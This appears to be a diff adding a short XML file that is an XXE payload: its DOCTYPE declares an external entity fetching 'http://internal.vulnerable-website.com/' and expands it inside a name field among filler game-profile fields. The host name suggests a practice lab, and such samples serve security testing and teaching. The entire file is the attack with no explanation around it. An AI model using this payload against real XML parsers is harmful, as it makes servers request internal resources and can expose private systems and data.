@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+<table_data>
+     <table_row>
+          <name>&xxe;</name>
+          <nickname>mypasstron</nickname>
+          <age>18</age>
+          <level>Colonel rank 18</level>
+          <rank>Silver Elite Master</rank>
+     </table_row>
+</table_data>
